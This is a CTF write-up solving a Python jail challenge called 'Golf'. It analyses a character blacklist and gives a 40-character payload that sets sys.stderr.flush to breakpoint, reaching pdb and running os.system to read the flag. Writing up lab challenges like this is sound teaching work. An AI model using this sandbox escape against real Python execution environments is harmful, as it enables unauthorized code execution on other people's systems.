# Golf

Categories: Jail/Python

Description:
>"Let's go golfin'"
>
> >    DJ Khaled
>
> 
>author: TheRomanXpl0it (TRX) staff
>
>[challenge-misc-golf.zip](challenge-misc-golf.zip)

**Tags:** sandbox, python escape, jail

## Takeaways

* Overwriting functions that are called automatically by the runtime

## Challenge

```python
#!/usr/bin/env python3.13
if(c:=input()).isascii()*~-any(x in(c)for(x)in'!"#\'()*+-:<>@[]\\_{}'):exec(c[:43])
```

## Solution
Let's break it down:

```python
#!/usr/bin/env python3.13
blacklisted = '!"#\'()*+-:<>@[]\\_{}'

c = input()

c1 = c.isascii()
c2 = any(x in c for x in blacklisted)
c3 = -c2        #     -any(x in c for x in blacklisted):
c4 = ~c3        #    ~-any(x in c for x in blacklisted):
c5 = c1 * c4    # c2*~-any(x in c for x in blacklisted):

print(f"c1: {c1}")
print(f"c2: {c2}")
print(f"c3: {c3}")
print(f"c4: {c4}")
print(f"c5: {c5}")

if c5:
    print("Executing")
    exec(c[:43])
else:
    print("blacklisted")
```

Let's produce the boolean matrix for `c5`:
```bash
# Supplying ascii characters (c1=True) and allowed:
$ python solution.py
print
c1: True
c2: False
c3: 0
c4: -1
c5: -1
Executing

# Supplying non-ascii characters (c1=False) and allowed:
$ python solution.py
😊
c1: False
c2: False
c3: 0
c4: -1
c5: 0
blacklisted

# Supplying ascii characters (c1=True) and blacklisted:
nikos@inspiron:~/ctfs/ctf-writeups/trx25/pwn/golf$ python solution.py
()
c1: True
c2: True
c3: -1
c4: 0
c5: 0
blacklisted

# Supplying non-ascii (c1=False) and blacklisted:
nikos@inspiron:~/ctfs/ctf-writeups/trx25/pwn/golf$ python solution.py
(😊)
c1: False
c2: True
c3: -1
c4: 0
c5: 0
blacklisted
```

So, by building the above boolean matrix for `c5 = bool(c1 * c4)`, our input must be ascii and the remaining condition is just a fancy blacklist. So, it is really a matter of finding an up to 43 characters payload with no direct function calls to pop a shell.

Since we have no direct function calls (i.e. operator `()`), we will overwrite a function that gets called automatically by the runtime. For example, `sys.stderr.write` and `sys.stderr.flush` are called when an exception occurs. `write` takes 1 argument but `flush` takes 0 arguments, so we can replace it with `breakpoint`:

```python
# When an undefined variable is used, such as "a",
# a "NameError: name 'a' is not defined" exception occurs
import sys;sys.stderr.flush=breakpoint;a # 40 chars length
> /usr/lib/python3.13/pdb.py(2347)set_trace()
-> pdb.set_trace(sys._getframe().f_back)
(Pdb)
```
This drops us inside the debugger and then we can read the flag:
```python
(Pdb) import os; os.system('cat flag')
TRX{https://www.youtube.com/watch?v=nSzTeFBa4qM}
```
